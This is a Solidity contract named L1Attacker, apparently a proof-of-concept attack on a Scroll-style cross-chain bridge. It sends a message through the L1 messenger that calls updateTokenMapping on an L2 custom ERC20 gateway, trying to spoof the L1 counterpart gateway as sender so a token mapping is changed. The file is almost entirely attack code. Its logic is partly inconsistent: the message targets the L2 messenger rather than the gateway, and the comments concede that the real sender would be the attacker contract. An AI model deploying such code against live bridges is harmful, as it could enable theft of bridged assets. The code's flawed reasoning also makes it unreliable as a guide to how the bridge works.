// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IL1ScrollMessenger {
    function sendMessage(
        address _to,
        uint256 _value,
        bytes memory _message,
        uint256 _gasLimit
    ) external payable;
}

interface IGatewayTarget {
    function updateTokenMapping(address _l2Token, address _l1Token) external;
}

contract L1Attacker {
    event MessageSent(
        address indexed l1Sender, // address(this)
        address indexed targetL2Gateway,
        address l1AttackerForPayload, // This is the _l1Token for updateTokenMapping
        address l2TokenForPayload,
        bytes xDomainCalldata
    );

    function initiateAttack(
        address _l1ScrollMessengerAddress,
        address _l2ScrollMessengerAddress, // The L2 counterpart of _l1ScrollMessengerAddress
        address _targetL2GatewayAddress,   // The actual L2 gateway we want to call a function on
        address _l2TokenAddress,
        address _l1CounterpartGatewayAddress // The L1 address we want xDomainMessageSender to be (for the spoof)
    ) external payable {
        // 1. Craft the inner payload for the L2 gateway function
        // This payload targets L2CustomERC20Gateway.updateTokenMapping(address _l2Token, address _l1Token)
        // _l2Token is our TargetL2Token
        // _l1Token is set to _l1CounterpartGatewayAddress, simulating what a legitimate call from
        // the L1 counterpart gateway might look like if it were updating a mapping for itself.
        bytes memory innerMessagePayload = abi.encodeCall(
            IGatewayTarget.updateTokenMapping,
            (_l2TokenAddress, _l1CounterpartGatewayAddress)
        );

        // 2. Call L1ScrollMessenger.sendMessage
        // L1ScrollMessenger will internally use `address(this)` (L1Attacker) as the original sender
        // when it constructs the full xDomainCalldata that gets put into the L1MessageQueue.
        // The `_to` parameter for `sendMessage` is the L2ScrollMessenger address.
        // The `_message` parameter is the `innerMessagePayload` intended for the target L2 Gateway.
        IL1ScrollMessenger(_l1ScrollMessengerAddress).sendMessage{value: msg.value}(
            _l2ScrollMessengerAddress, // Target L2 Scroll Messenger
            0,                         // ETH value for the L2 message (can be > 0 if L1ScrollMessenger.sendMessage is payable)
            innerMessagePayload,       // The actual message for the L2 target gateway
            200000                     // Gas limit for L2 execution
        );

        // For logging purposes, we reconstruct what the L1ScrollMessenger *would* encode as the
        // xDomainCalldata. This helps verify our understanding of how `address(this)` (L1Attacker)
        // becomes the `_from` field in the `relayMessage` call on L2.
        // Note: The actual nonce used by L1ScrollMessenger when it calls L1MessageQueue
        // will be managed by L1MessageQueue; '0' here is a placeholder for logging.
        bytes memory representativeXDomainCalldata = abi.encodeWithSignature(
            "relayMessage(address,address,uint256,uint256,bytes)",
            address(this),            // This should be the xDomainMessageSender on L2 if Sequencer is honest
            _targetL2GatewayAddress,  // The L2 gateway that L2ScrollMessenger will call
            0,                        // Value for the call to the L2 gateway
            0,                        // Placeholder for nonce in this representative structure
            innerMessagePayload       // The message payload for the L2 gateway
        );

        emit MessageSent(
            address(this),
            _targetL2GatewayAddress,
            _l1CounterpartGatewayAddress, // Logged as l1AttackerForPayload (the _l1Token in updateTokenMapping)
            _l2TokenAddress,              // Logged as l2TokenForPayload
            representativeXDomainCalldata // Log the representative xDomainCalldata structure
        );
    }
}
